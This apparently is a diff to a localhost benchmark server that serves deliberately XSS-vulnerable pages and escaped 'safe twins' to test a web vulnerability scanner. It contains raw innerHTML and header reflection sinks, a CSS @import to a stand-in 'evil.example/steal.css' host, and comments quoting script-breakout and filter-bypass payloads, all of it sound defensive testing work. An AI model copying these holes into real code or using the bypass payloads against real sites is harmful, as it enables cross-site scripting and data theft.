@@ -6,7 +6,7 @@ Each endpoint's rendering is determined by the "mode" field in manifest.json.
 Used exclusively by the benchmark runner to evaluate scanner accuracy.
 
 Usage:
-    python benchmark/server.py [--port 8877]
+    python benchmark/server.py [--port 18777]
 """
 from __future__ import annotations
 
@@ -17,18 +17,43 @@ import os
 import re
 import sys
 from html.parser import HTMLParser   # Phase 124: parser-aware resource unfurl
-from http.server import HTTPServer, BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import urlparse, parse_qs, unquote, quote
 import urllib.request               # Phase 124: resolve unfurled resources
 
 _HERE = os.path.dirname(os.path.abspath(__file__))
 _MANIFEST_PATH = os.path.join(_HERE, "manifest.json")
-DEFAULT_PORT = 8877
+# Phase 179 migrated every project default out of the Windows reserved
+# range 8810-9109 (netsh excludedportrange eats those binds).  The
+# workspace wipe reverted this file to an OLDER copy that also lost 14
+# auxiliary endpoints and _safe_header_value; restored from 2959a34.
+DEFAULT_PORT = 18777
 
 
 # ---------------------------------------------------------------------------
 # Page wrappers
 # ---------------------------------------------------------------------------
+
+def _safe_header_value(value: str) -> str:
+    """Encode an HTTP field value the way RFC 7230 requires: octets above
+    U+00FF are not representable in a header at all.
+
+    This is a target-side defect, not a scanner one.  Our own fullwidth
+    transform family (`transform.t_fullwidth`) maps ASCII to U+FF01..U+FF5E,
+    and a `header_only` reflection mode copies the query value straight into
+    a response header -- so stdlib's `send_header` raised UnicodeEncodeError
+    inside the handler, the connection died without a response, and the
+    engine recorded an ERROR on a case it never actually got to evaluate.
+    A gate that turns *its own fixture* into "scanner did not measure this"
+    is worse than no gate, so unrepresentable codepoints now come back
+    percent-encoded: still a faithful statement of what the probe sent,
+    and it keeps the response intact.
+    """
+    return "".join(
+        ch if ord(ch) <= 0xFF
+        else "".join("%%%02X" % b for b in ch.encode("utf-8"))
+        for ch in value)
+
 
 def _page(body: str, headers: dict | None = None) -> tuple[int, dict, str]:
     """Wrap body in a minimal HTML page."""
@@ -97,6 +122,24 @@ def m_raw_math_href(v: str) -> tuple: return _page(f'<math><a xlink:href="{v}">x
 def m_raw_href_js(v: str) -> tuple: return _page(f'<a href="{v}">link</a>')
 def m_raw_href_data(v: str) -> tuple: return _page(f'<a href="{v}">link</a>')
 def m_raw_meta_refresh(v: str) -> tuple: return _page(f'<meta http-equiv="refresh" content="0;url={v}">')
+
+
+def m_escape_meta_refresh_js(v: str) -> tuple:
+    """Phase 168: a meta refresh whose value is escaped, so the payload keeps
+    its ``javascript:`` scheme but loses the quotes that would let it break out
+    of the attribute.
+
+    This is the safe twin of ``raw_meta_refresh``, and the only shape that
+    isolates the "meta refresh is a javascript: sink" claim: everything else the
+    scanner sends here cannot break out, so a finding can only come from a
+    detector still treating that scheme as execution.  Measured non-executing in
+    Chromium -- see ``_p168_meta_probe.py`` and
+    ``tests/test_phase35.py::test_meta_refresh_javascript_is_not_a_sink``.
+    """
+    return _page('<meta http-equiv="refresh" content="0;url='
+                 f'{html.escape(v, quote=True)}">')
+
+
 def m_raw_iframe_src(v: str) -> tuple: return _page(f'<iframe src="{v}"></iframe>')
 def m_raw_iframe_srcdoc(v: str) -> tuple: return _page(f'<iframe srcdoc="{v}"></iframe>')
 def m_raw_base_href(v: str) -> tuple: return _page(f'<base href="{v}">')
@@ -125,6 +168,114 @@ def m_dom_hash_innerhtml(v: str) -> tuple:
 <div id="out"></div>
 <script>document.getElementById('out').innerHTML = location.hash.slice(1);</script>
 </body></html>""")
+
+# ---------------------------------------------------------------------------
+# Phase 146: hash-ROUTED parameters (``#/route?q=``)
+#
+# pos-dom-01 above reads the WHOLE fragment (``location.hash.slice(1)``), so
+# the engine's plain ``#MARKER`` probe satisfies it and it passes without ever
+# parsing a fragment query string.  A real SPA router is different: the value
+# sits inside the fragment's own query (``#/search?q=``), behind a route path
+# that must be preserved.  Both official XSS challenges on OWASP Juice Shop
+# are that shape and both went undetected -- the benchmark "had a hash case"
+# and it was testing a different shape.  These two modes are the missing one.
+# ---------------------------------------------------------------------------
+
+def m_dom_hash_route_innerhtml(v: str) -> tuple:
+    """Router-shaped fragment parameter reaching innerHTML."""
+    return _page_raw("""<!DOCTYPE html><html><body>
+<div id="out"></div>
+<script>
+function render(){
+  var qs = (location.hash.split('?')[1] || '');
+  var q = new URLSearchParams(qs).get('q');
+  if (q) { document.getElementById('out').innerHTML = q; }
+}
+window.addEventListener('hashchange', render);
+render();
+</script>
+</body></html>""")
+
+
+def m_dom_hash_route_safe(v: str) -> tuple:
+    """The same router shape, written as TEXT instead of HTML."""
+    return _page_raw("""<!DOCTYPE html><html><body>
+<div id="out"></div>
+<script>
+function render(){
+  var qs = (location.hash.split('?')[1] || '');
+  var q = new URLSearchParams(qs).get('q');
+  if (q) { document.getElementById('out').textContent = q; }
+}
+window.addEventListener('hashchange', render);
+render();
+</script>
+</body></html>""")
+
+
+def m_dom_tt_wrapper_innerhtml(v: str) -> tuple:
+    """Router-shaped fragment parameter reaching innerHTML as a NON-PRIMITIVE.
+
+    Phase 151, locks the Phase 144 fix in dom_engine.has().  Angular (and any
+    Trusted Types app) hands the innerHTML setter a TrustedHTML wrapper, not a
+    string: typeof is 'object', and the old has() (typeof v === 'string') went
+    silent on EVERY assignment of such pages.  The browser coerces the value
+    via ToString when it parses, so the payload still executes -- a real
+    vulnerability whose sink hook receives an object.
+
+    A real TrustedHTML is created via a permissive policy when the runtime
+    offers one (Chromium does, CSP or not); elsewhere a {toString} wrapper
+    exercises the identical has() contract.  The policy is created once per
+    document so hashchange re-renders keep wrapping (per-document names are
+    single-use and a second createPolicy would throw).
+    """
+    return _page_raw("""<!DOCTYPE html><html><body>
+<div id="out"></div>
+<script>
+var POL = null;
+try {
+  if (window.trustedTypes && trustedTypes.createPolicy) {
+    POL = trustedTypes.createPolicy('probePolicy',
+            { createHTML: function(s){ return s; } });
+  }
+} catch (e) { POL = null; }
+function render(){
+  var qs = (location.hash.split('?')[1] || '');
+  var q = new URLSearchParams(qs).get('q');
+  if (!q) { return; }
+  var val = POL ? POL.createHTML(q) : { toString: function(){ return q; } };
+  document.getElementById('out').innerHTML = val;
+}
+window.addEventListener('hashchange', render);
+render();
+</script>
+</body></html>""")
+
+
+def m_dom_tt_wrapper_safe(v: str) -> tuple:
+    """The identical wrapper shape, written as TEXT (textContent is not a sink)."""
+    return _page_raw("""<!DOCTYPE html><html><body>
+<div id="out"></div>
+<script>
+var POL = null;
+try {
+  if (window.trustedTypes && trustedTypes.createPolicy) {
+    POL = trustedTypes.createPolicy('probePolicy',
+            { createHTML: function(s){ return s; } });
+  }
+} catch (e) { POL = null; }
+function render(){
+  var qs = (location.hash.split('?')[1] || '');
+  var q = new URLSearchParams(qs).get('q');
+  if (!q) { return; }
+  var val = POL ? POL.createHTML(q) : { toString: function(){ return q; } };
+  document.getElementById('out').textContent = val;
+}
+window.addEventListener('hashchange', render);
+render();
+</script>
+</body></html>""")
+
 
 def m_dom_search_eval(v: str) -> tuple:
     return _page_raw("""<!DOCTYPE html><html><body>
@@ -370,6 +521,31 @@ def m_header_only(v: str) -> tuple:
     return _page("<div>static content, no reflection in body</div>",
                  {"X-Reflected-Input": v})
 
+# --- Phase 172: reflection reachable ONLY through a LATE injectable header ---
+#
+# Phase 171 removed the `INJECTABLE_HEADERS[:6]` slice from the header
+# carrier, and no existing case could have caught that class of bug: every
+# other header case either reflects a query PARAMETER or echoes into a
+# RESPONSE header (neg-header-01), so nothing depended on the scanner
+# actually sending entry #7 or beyond.  `True-Client-IP` is entry 7 -- with
+# the slice in place these endpoints are a false negative / a true negative;
+# without it, a true positive / still a true negative.  That is the contract
+# this pair locks (mirrors Juice Shop's build/routes/saveLoginIp.js:55, which
+# reads exactly this header).
+def m_late_header_reflect(v: str, ctx: dict) -> tuple:
+    """Vulnerable: the True-Client-IP request header is rendered RAW into the
+    body.  The query parameter is ignored on purpose -- the payload has to
+    arrive through that header or not at all."""
+    late = (ctx.get("headers") or {}).get("True-Client-IP", "")
+    return _page(f'<div id="client-ip">{late}</div>')
+
+
+def m_late_header_reflect_escaped(v: str, ctx: dict) -> tuple:
+    """Safe twin: same header, HTML-escaped -- reflection without execution."""
+    late = html.escape((ctx.get("headers") or {}).get("True-Client-IP", ""),
+                       quote=True)
+    return _page(f'<div id="client-ip">{late}</div>')
+
 # --- Safe JS sinks ---
 def m_js_textcontent(v: str) -> tuple:
     escaped = v.replace("\\", "\\\\").replace('"', '\\"').replace("</", "<\\/")
@@ -423,6 +599,36 @@ def m_cookie_echo_escaped(v: str, ctx: dict) -> tuple:
     """Safe twin: same echo, HTML-escaped."""
     val = html.escape(_cookie_value(ctx, "lang"), quote=True)
     return _page(f'<div>Language: {val}</div>')
+
+
+def m_cookie_toss_parent(v: str, ctx: dict) -> tuple:
+    """Vulnerable: Set-Cookie with a Domain= BROADER than the response host.
+
+    Cookie tossing needs a parent/child domain pair, and this case supplies one
+    with no DNS or hosts-file work: the manifest asks for ``host=sub.localhost``
+    (see ``runner._build_target_url``) and ``*.localhost`` resolves to loopback
+    under RFC 6761.  The cookie is scoped to ``.localhost``, so it is delivered
+    to *sibling* origins as well -- exactly the relation
+    ``cookie_tossing.is_parent_domain_cookie`` tests
+    (``host.endswith("." + domain)``).
+
+    No user input is interpolated on purpose: this layer keys on the header, and
+    a reflecting page would add unrelated findings to the case.
+    """
+    return _page("<div>Theme: light</div>",
+                 {"Set-Cookie": "theme=light; Domain=.localhost; Path=/"})
+
+
+def m_cookie_toss_self(v: str, ctx: dict) -> tuple:
+    """Safe twin: same page, same cookie name, scoped to the response host.
+
+    ``Domain=sub.localhost`` equals the response host, so the cookie never
+    reaches a sibling origin and there is nothing to toss.  That single change
+    is the premise this layer actually tests -- a safe twin that altered some
+    other field would prove nothing.
+    """
+    return _page("<div>Theme: light</div>",
+                 {"Set-Cookie": "theme=light; Domain=sub.localhost; Path=/"})
 
 
 def m_path_echo(v: str, ctx: dict) -> tuple:
@@ -545,7 +751,6 @@ def m_markdown_filtered(v: str, ctx: dict) -> tuple:
 #                different URL (scanner_stored)
 # ---------------------------------------------------------------------------
 
-import cgi  # noqa: E402  (stdlib; only used for multipart parsing)
 import email as _email  # noqa: E402
 
 # inject-path -> [stored values]  (process-lifetime, like a real toy app)
@@ -659,18 +864,165 @@ def m_json_echo(v: str, ctx: dict) -> tuple:
     return _page(f'<div>{"status": "ok", "echo": "{val}"}</div>')
 
 
+def m_jsonct_raw(v: str, ctx: dict) -> tuple:
+    """JSON-shaped body served as REAL ``application/json``, echoing raw.
+
+    Note what every other JSON-ish handler here does: it returns through
+    ``_page()``, which forces ``Content-Type: text/html``.  A reflection in one
+    of those IS in an HTML context and really is exploitable -- so until this
+    pair existed, no case ever exercised scanner.py's Phase 32 content-type
+    branch, even though the layer matrix read 50/50 (layer coverage is not
+    branch coverage).
+
+    Markup inside a JSON body does not execute in a browser tab.  The engine
+    keeps the finding for the record and drops it to low confidence, so this
+    case locks THAT behaviour deliberately: it asserts "reported, at low
+    confidence", not "exploitable".
+    """
+    val = (ctx.get("fields") or {}).get(ctx.get("field") or "q", "") or v
+    return (200, {"Content-Type": "application/json; charset=utf-8"},
+            json.dumps({"status": "ok", "echo": val}))
+
+
+def m_jsonct_escaped(v: str, ctx: dict) -> tuple:
+    """Safe twin: same JSON response, markup escaped to \\u003c / \\u003e.
+
+    ``json.dumps`` escapes quotes but NOT angle brackets, so it cannot serve
+    as the safe twin on its own -- both halves would be byte-identical and the
+    pair would prove nothing.  A real API that treats the value as data
+    escapes the brackets; doing so here removes the one premise this layer
+    keys on (the payload appearing verbatim in the response).
+    """
+    val = (ctx.get("fields") or {}).get(ctx.get("field") or "q", "") or v
+    val = val.replace("<", "\\u003c").replace(">", "\\u003e")
+    return (200, {"Content-Type": "application/json; charset=utf-8"},
+            json.dumps({"status": "ok", "echo": val}))
+
+
+# ---------------------------------------------------------------------------
+# Phase 152: SPA-shaped stored XSS.  The write endpoint accepts form-encoded
+# AND JSON bodies (_parse_post_body handles both).  The VIEW page never
+# contains the stored value in its HTML -- it fetches a JSON list endpoint
+# client-side and inserts the entries with innerHTML (vuln) / textContent
+# (safe twin).  That is the shape HTTP-text persistence verification cannot
+# confirm (OWASP Juice Shop: POST /api/Feedbacks renders only inside the
+# authenticated /#/administration route) and only the real-browser DOM
+# engine can detect.
+# ---------------------------------------------------------------------------
+
+def m_stored_api_write(v: str, ctx: dict) -> tuple:
+    """Store the submitted value verbatim (form or JSON body)."""
+    _STORE.setdefault(ctx.get("path") or "", []).append(v)
+    return _page(f"<div>Saved: {v}</div>")
+
+
+def m_stored_api_write_escaped(v: str, ctx: dict) -> tuple:
+    """Safe twin: store the HTML-escaped value."""
+    _STORE.setdefault(ctx.get("path") or "", []).append(
+        html.escape(v, quote=True))
+    return _page(f"<div>Saved: {html.escape(v, quote=True)}</div>")
+
+
+def m_stored_api_list(v: str, ctx: dict) -> tuple:
+    """JSON list of stored entries (what the SPA viewer XHRs)."""
+    key = ctx.get("path") or ""
+    if key.endswith("/list"):
+        key = key[:-len("/list")]
+    items = _STORE.get(key, [])
+    return (200, {"Content-Type": "application/json; charset=utf-8"},
+            json.dumps(items))
+
+
+def m_stored_user_write(v: str, ctx: dict) -> tuple:
+    """User-write shape (Phase 153, Juice Shop POST /api/Users): a
+    register/profile API that REJECTS a POST without companion fields --
+    the payload rides in ``email`` but ``password`` must be present, so a
+    single-field submission can never complete a write (measured live:
+    scan_stored_dom needed --stored-extra to close the loop here)."""
+    fields = ctx.get("fields") or {}
+    if not fields.get("password"):
+        return (400, {"Content-Type": "text/plain; charset=utf-8"},
+                "password required")
+    _STORE.setdefault(ctx.get("path") or "", []).append(v)
+    return _page("<div>User created</div>")
+
+
+def m_stored_user_write_escaped(v: str, ctx: dict) -> tuple:
+    """Safe twin: companion fields demanded AND the email HTML-escaped."""
+    fields = ctx.get("fields") or {}
+    if not fields.get("password"):
+        return (400, {"Content-Type": "text/plain; charset=utf-8"},
+                "password required")
+    _STORE.setdefault(ctx.get("path") or "", []).append(
+        html.escape(v, quote=True))
+    return _page("<div>User created</div>")
+
+
+def m_stored_api_view(v: str, ctx: dict) -> tuple:
+    """Vulnerable SPA viewer: fetched entries inserted via innerHTML."""
+    list_url = (ctx.get("path") or "")[:-len("/view")] + "/list"
+    return _page_raw(f"""<!DOCTYPE html><html><body>
+<div id="feed"></div>
+<script>
+fetch('{list_url}').then(function(r){{return r.json();}}).then(function(items){{
+  var out = '';
+  for (var i = 0; i < items.length; i++) {{ out += '<li>' + items[i] + '</li>'; }}
+  document.getElementById('feed').innerHTML = out;
+}});
+</script>
+</body></html>""")
+
+
+def m_stored_api_view_safe(v: str, ctx: dict) -> tuple:
+    """Safe twin: the identical SPA viewer written with textContent."""
+    list_url = (ctx.get("path") or "")[:-len("/view")] + "/list"
+    return _page_raw(f"""<!DOCTYPE html><html><body>
+<div id="feed"></div>
+<script>
+fetch('{list_url}').then(function(r){{return r.json();}}).then(function(items){{
+  var el = document.getElementById('feed');
+  for (var i = 0; i < items.length; i++) {{
+    var p = document.createElement('p');
+    p.textContent = items[i];
+    el.appendChild(p);
+  }}
+}});
+</script>
+</body></html>""")
+
+
 POST_MODES: dict = {
     "stored_write": m_stored_write,
     "stored_write_escaped": m_stored_write_escaped,
     "stored_view": m_stored_view,
+    "stored_api_write": m_stored_api_write,
+    "stored_api_write_escaped": m_stored_api_write_escaped,
+    "stored_api_user_write": m_stored_user_write,
+    "stored_api_user_write_escaped": m_stored_user_write_escaped,
+    "stored_api_list": m_stored_api_list,
+    "stored_api_view": m_stored_api_view,
+    "stored_api_view_safe": m_stored_api_view_safe,
     "upload_echo": m_upload_echo,
     "upload_echo_escaped": m_upload_echo_escaped,
     "json_echo": m_json_echo,
+    # Phase 176g: the only pair whose response is REAL application/json.  All
+    # the other JSON-shaped handlers go through _page() and are text/html.
+    "jsonct_raw": m_jsonct_raw,
+    "jsonct_escaped": m_jsonct_escaped,
 }
 
 MODES_CTX: dict = {
+    # Phase 172: this pair's reflection depends on the scanner actually
+    # sending a LATE injectable header (see m_late_header_reflect above).
+    "late_header_reflect": m_late_header_reflect,
+    "late_header_reflect_escaped": m_late_header_reflect_escaped,
     "cookie_echo": m_cookie_echo,
     "cookie_echo_escaped": m_cookie_echo_escaped,
+    # Phase 176f: the cookie-tossing pair.  Needs a genuine parent/child host
+    # pair, which the manifest case supplies with host=sub.localhost -- see the
+    # handler docstrings for why that works without DNS.
+    "cookie_toss_parent": m_cookie_toss_parent,
+    "cookie_toss_self": m_cookie_toss_self,
     "path_echo": m_path_echo,
     "path_echo_escaped": m_path_echo_escaped,
     "error_echo": m_error_echo,
@@ -843,12 +1195,19 @@ def m_sri_vuln(v: str, ctx: dict) -> tuple:
 
 
 def m_sri_safe(v: str, ctx: dict) -> tuple:
-    """Safe twin: same third-party script, integrity + crossorigin."""
+    """Safe twin: same third-party script, integrity + crossorigin.
+
+    Phase 136: the reflected value is escaped.  This twin used to interpolate
+    it RAW into the div, so the page was a plain XSS while being labelled
+    `safe` -- the engine's `reflected` finding was CORRECT and the LABEL was
+    wrong.  A twin's "safe" premise must be the single property under test
+    (here: SRI present), not "and also no trivial injection".
+    """
     return _page('<script src="https://cdn.example/lib.js" '
                  'integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/'
                  'uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC" '
                  'crossorigin="anonymous"></script>'
-                 f'<div>{v}</div>')
+                 f'<div>{html.escape(v or "")}</div>')
 
 
 def m_tt_vuln(v: str, ctx: dict) -> tuple:
@@ -860,13 +1219,36 @@ def m_tt_vuln(v: str, ctx: dict) -> tuple:
         "</script><div id='o'></div>")
 
 
+def _js_string_literal(v: str) -> str:
+    """JS string literal for an inline <script> block (Phase 136).
+
+    Two encodings are needed, not one:
+      * ``json.dumps`` -- escapes the quote/backslash so the value cannot
+        break out of the JS STRING;
+      * ``<`` -> ``\\u003c`` -- json.dumps does NOT touch angle brackets, so
+        a value containing ``</script`` would still terminate the SCRIPT
+        BLOCK in the HTML parser no matter how well the string is quoted.
+        Both twins missed the second one, and the engine's
+        ``script_string_*`` payloads (``"></script><script>...``) were
+        perfectly correct to confirm.
+    """
+    return json.dumps(v or "").replace("<", "\\u003c").replace(">", "\\u003e")
+
+
 def m_tt_safe(v: str, ctx: dict) -> tuple:
-    """Safe twin: policy sanitises instead of passing through."""
+    """Safe twin: policy sanitises instead of passing through.
+
+    Phase 136: the value is encoded for an inline JS string (see
+    ``_js_string_literal``).  It used to sit raw between single quotes, so
+    `';alert(1);//` broke out of the string and ran -- the engine's
+    confirmation was CORRECT and this twin was mislabelled `safe`.
+    """
     return _page(
         "<script>"
         "trustedTypes.createPolicy('p', {createHTML: (s) => s.replace("
         "/</g, '&lt;')});"
-        f"document.getElementById('o').innerHTML = '{v}';"
+        f"document.getElementById('o').innerHTML = "
+        f"{_js_string_literal(v)};"
         "</script><div id='o'></div>")
 
 
@@ -924,14 +1306,31 @@ def m_sanitizer_vuln(v: str, ctx: dict) -> tuple:
 def m_sanitizer_safe(v: str, ctx: dict) -> tuple:
     """Safe twin: current version AND the sanitised output goes to a
     non-sink (textContent).  (The layer flags any sanitise->innerHTML
-    flow, so changing only the version would still report.)"""
+    flow, so changing only the version would still report.)
+
+    Phase 136: the value is encoded for an inline JS string (see
+    ``_js_string_literal``).  It used to sit raw between double quotes, so a
+    `"` -- or, more decisively, a `</script>` -- broke out and ran: the
+    engine's `script_string_dq` confirmation was CORRECT.
+
+    Phase 189: the pinned version moved 3.0.6 -> 3.4.16.  This is the fixture
+    being stale, not the scanner: since CVE-2024-47875 (nesting mXSS) and
+    CVE-2024-45801 were published, 3.0.6 IS a vulnerable DOMPurify, so the
+    layer's high finding on it is true and "current version" had to catch up
+    with the vendor's actual current release.  The ``integrity`` value is the
+    hash jsdelivr published for 3.0.6 and is therefore decorative here -- the
+    benchmark never fetches the file, and dropping the attribute entirely
+    would trip sri_bypass's "cross-origin script without SRI" (high), which
+    would make this safe page a false positive for a different reason.  Do not
+    copy this tag into a real page.
+    """
     return _page(
-        '<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6'
+        '<script src="https://cdn.jsdelivr.net/npm/dompurify@3.4.16'
         '/dist/purify.min.js" integrity="sha384-aLMwkQFyLD6+QVnoIOJGuXs+fPHjPoUIQb8fAOr1UQgiuhDRImXlHZJEUS8ki3WD"'
         ' crossorigin="anonymous"></script>'
         '<div id="o"></div><script>'
         'document.getElementById("o").textContent = '
-        f'DOMPurify.sanitize("{v}");'
+        f'DOMPurify.sanitize({_js_string_literal(v)});'
         '</script>')
 
 
@@ -1136,12 +1535,25 @@ def m_pm_safe(v: str, ctx: dict) -> tuple:
 # parameters (param:"" -> clean URL).  The earlier "the layer can never
 # fire in this pipeline" note was WRONG: it fired the param-marker
 # reasoning at a page-level layer.
+#
+# Phase 140 correction: "the page ships a gadget" is not "the page is
+# exploitable".  The old vuln target was a plain static @import with no
+# user input anywhere -- byte-for-byte the shape of a page legitimately
+# loading a CDN stylesheet (Google Fonts emits @font-face + unicode-range
+# + external src:url()).  Scanned against OWASP Juice Shop that rule
+# produced a *high* false positive while both real XSS went unreported.
+# CSSI is, by this module's own definition, "attacker-controlled input
+# placed into a CSS context" -- so the gadget must be user-controlled.
+# The template variable keeps it a static, parameterless page (pure static
+# analysis still finds it) while making the CSS context genuinely
+# attacker-controlled.
 # ---------------------------------------------------------------------------
 
 def m_cssi_vuln(v: str, ctx: dict) -> tuple:
-    """Static page whose <style> imports an external stylesheet."""
+    """Static page whose <style> interpolates a template var into @import."""
     return _page("<h1>Theme demo</h1>"
-                 "<style>@import url(https://evil.example/steal.css);</style>"
+                 "<style>@import url(https://evil.example/steal.css"
+                 "?theme={{user_theme}});</style>"
                  "<p>Custom theme preview.</p>")
 
 
@@ -1150,6 +1562,26 @@ def m_cssi_safe(v: str, ctx: dict) -> tuple:
     return _page("<h1>Theme demo</h1>"
                  "<style>.theme-box{color:#333;padding:8px;}</style>"
                  "<p>Custom theme preview.</p>")
+
+
+def m_cssi_gfonts_safe(v: str, ctx: dict) -> tuple:
+    """Phase 140: an ordinary page loading a real CDN webfont.
+
+    Not a vulnerability -- nothing here is attacker-controlled.  This is
+    the regression guard for the false positive seen on OWASP Juice Shop:
+    a page using Google Fonts emits exactly the @font-face + unicode-range
+    + external src:url() gadget shape.
+    """
+    return _page(
+        "<h1>Shop</h1>"
+        "<style>"
+        "@font-face{font-family:'VT323';font-style:normal;font-weight:400;"
+        "font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/"
+        "pxiKyp0ihIEF2isfFJU.woff2) format('woff2');"
+        "unicode-range:U+0102-0103,U+0110-0111;}"
+        "body{font-family:'VT323',monospace}"
+        "</style>"
+        "<p>Welcome to the shop.</p>")
 
 
 # ---------------------------------------------------------------------------
@@ -1466,6 +1898,7 @@ MODES_CTX.update({
 PAGE_MODES.update({
     "cssi_vuln": m_cssi_vuln,
     "cssi_safe": m_cssi_safe,
+    "cssi_gfonts_safe": m_cssi_gfonts_safe,
     "pe_vuln": m_pe_vuln,
     "pe_safe": m_pe_safe,
     "clobber_vuln": m_clobber_vuln,
@@ -1639,6 +2072,7 @@ MODES: dict[str, callable] = {
     "raw_href_js": m_raw_href_js,
     "raw_href_data": m_raw_href_data,
     "raw_meta_refresh": m_raw_meta_refresh,
+    "escape_meta_refresh_js": m_escape_meta_refresh_js,
     "raw_iframe_src": m_raw_iframe_src,
     "raw_iframe_srcdoc": m_raw_iframe_srcdoc,
     "raw_base_href": m_raw_base_href,
@@ -1651,6 +2085,10 @@ MODES: dict[str, callable] = {
     "raw_double_decode": m_raw_double_decode,
     # DOM-based
     "dom_hash_innerhtml": m_dom_hash_innerhtml,
+    "dom_hash_route_innerhtml": m_dom_hash_route_innerhtml,
+    "dom_hash_route_safe": m_dom_hash_route_safe,
+    "dom_tt_wrapper_innerhtml": m_dom_tt_wrapper_innerhtml,
+    "dom_tt_wrapper_safe": m_dom_tt_wrapper_safe,
     "dom_search_eval": m_dom_search_eval,
     "dom_postmessage": m_dom_postmessage,
     "dom_hash_docwrite": m_dom_hash_docwrite,
@@ -1776,6 +2214,48 @@ def m_fuzz_render(v: str, ctx: dict) -> tuple:
     value = v or ""
     if esc in ("html", "attr"):
         value = html.escape(value, quote=True)
+    elif esc == "strip_script":
+        # Classic "remove <script> tags" sanitizer -- the target of the
+        # recursive-strip bypass (<scr<script>ipt>).
+        value = re.sub(r"</?script[^>]*>", "", value, flags=re.I)
+    elif esc == "encode_angles":
+        # Escape the angle brackets ONLY, leaving quotes raw: an attribute
+        # break-out that needs no "<" still works.
+        value = value.replace("<", "&lt;").replace(">", "&gt;")
+    elif esc == "encode_quotes":
+        # Mirror image of encode_angles: escape the QUOTES only, leaving
+        # angle brackets raw.  Tag-shaped payloads still live in text
+        # contexts; attribute break-outs (which need a quote) die.
+        value = (value.replace('"', "&quot;").replace("'", "&#x27;"))
+    elif esc == "strip_tags":
+        # Drop every tag.  A payload whose power comes from a tag dies; one
+        # that only needs a quote or a space (attribute break-out) survives.
+        value = re.sub(r"<[^>]*>", "", value)
+    elif esc == "strip_handlers":
+        # Remove event-handler attributes only (`on...=`): the classic
+        # "blacklist on* handlers" filter.  Tag payloads and javascript:
+        # URIs are untouched.
+        value = re.sub(r"\son\w+\s*=\s*(?:\"[^\"]*\"|'[^']*'|[^\s>]*)", "",
+                       value, flags=re.I)
+    elif esc == "entity_decode":
+        # The app DECODES entities once before output (the double-decoding
+        # bug class): an entity-encoded payload such as `&#60;script&#62;`
+        # turns back into a live tag.
+        value = html.unescape(value)
+    elif esc == "escape_lt_only":
+        # Half-hearted escaping: only "<" is escaped, ">" and quotes stay
+        # raw -- attribute break-outs that need no "<" are still live, and
+        # the corpus's multi-encode shapes matter here.
+        value = value.replace("<", "&lt;")
+    elif esc == "strip_script_recursive":
+        # The hardened version of `strip_script`: keep stripping until no
+        # script tag is left, so the recursive-strip bypass
+        # (<scr<script>ipt>) does NOT work here.
+        while re.search(r"</?script", value, re.I):
+            new = re.sub(r"</?script[^>]*>", "", value, flags=re.I)
+            if new == value:
+                break
+            value = new
     return _page(tpl.replace("{}", value) + _FUZZ_SINKS.get(sink, ""))
 
 
@@ -1790,13 +2270,26 @@ EXTRA_ROUTES: dict = {
 MODES_CTX.update({"fuzz_render": m_fuzz_render})
 
 
+def _request_path(path: str) -> str:
+    """The path a client actually requests for a manifest ``path``.
+
+    Phase 146: a case may carry its payload behind a fragment
+    (``/dom/hash-route#/route``), because that is where an SPA router keeps
+    its parameters.  An HTTP request never includes the fragment, so the
+    server only ever sees the part before the ``#`` -- registering the raw
+    string made such cases 404.  The fragment still reaches the DOM engine,
+    which is the only layer that can use it.
+    """
+    return path.split("#", 1)[0] or "/"
+
+
 def load_routes() -> dict[str, dict]:
     """Load manifest and build path -> case routing table."""
     with open(_MANIFEST_PATH, "r", encoding="utf-8") as f:
         manifest = json.load(f)
     routes = {}
     for case in manifest["cases"]:
-        routes[case["path"]] = case
+        routes[_request_path(case["path"])] = case
         # Three capabilities need a RENDERER page that is not a manifest
         # case of its own.  Each gets its own manifest key so the flows stay
         # independent (e.g. view_path also wires --stored-inject, which a
@@ -1807,6 +2300,11 @@ def load_routes() -> dict[str, dict]:
                 ("scenario_view_path", "sc_view"),         # Phase 127
         ):
             _register_viewer(routes, case, key, default_mode)
+        # Phase 152: SPA-shaped stored cases expose their client-fetched
+        # data as a JSON list endpoint next to the write endpoint.
+        if case.get("list_path"):
+            routes.setdefault(case["list_path"],
+                              dict(case, mode="stored_api_list"))
     # Phase 129: harness-only routes (never scored).  setdefault so a real
     # manifest case with the same path would win.
     for path, extra in EXTRA_ROUTES.items():
@@ -1841,7 +2339,21 @@ def _register_viewer(routes: dict, case: dict, key: str,
 # ---------------------------------------------------------------------------
 
 class BenchmarkHandler(BaseHTTPRequestHandler):
+    # HTTP/1.1 keep-alive: without it every scan request
+    # leaves a TIME_WAIT client socket, and a multi-thousand-
+    # request benchmark run exhausts Windows ephemeral ports
+    # (connects then stall with zero CPU).  Responses all set
+    # Content-Length, which HTTP/1.1 requires.
+    protocol_version = "HTTP/1.1"
     routes: dict[str, dict] = {}
+
+    # HTTPServer accepts one connection at a time, and a client that is killed
+    # mid-run (the runner's `subprocess.run(timeout=60)` does exactly that)
+    # leaves its keep-alive socket open.  With the default `timeout = None` the
+    # accept loop then sits in `readinto` forever and every later case "times
+    # out" -- the reason a full 185-case run never returned.  Measured with
+    # faulthandler: server thread in socket.py:704 readinto, 0.2 CPU-s in 20 min.
+    timeout = 5
 
     def do_GET(self):
         parsed = urlparse(self.path)
@@ -1962,7 +2474,7 @@ class BenchmarkHandler(BaseHTTPRequestHandler):
     def _respond(self, status: int, headers: dict, body: str):
         self.send_response(status)
         for k, v in headers.items():
-            self.send_header(k, v)
+            self.send_header(k, _safe_header_value(v))
         self.send_header("Content-Length", str(len(body.encode("utf-8"))))
         self.end_headers()
         self.wfile.write(body.encode("utf-8"))
@@ -1986,7 +2498,13 @@ def run_server(port: int = DEFAULT_PORT, ready_callback=None):
     routes = load_routes()
     BenchmarkHandler.routes = routes
 
-    server = HTTPServer(("127.0.0.1", port), BenchmarkHandler)
+    # Threading, not HTTPServer: an abandoned client connection (the runner
+    # kills a scanner subprocess on its per-case timeout, which leaves the
+    # socket half-open) holds a single-threaded accept loop until `timeout`
+    # expires.  Measured: next request 5.01s behind one abandoned connection
+    # with HTTPServer, 0.01s with ThreadingHTTPServer.  Every other probe that
+    # serves this handler already uses ThreadingHTTPServer.
+    server = ThreadingHTTPServer(("127.0.0.1", port), BenchmarkHandler)
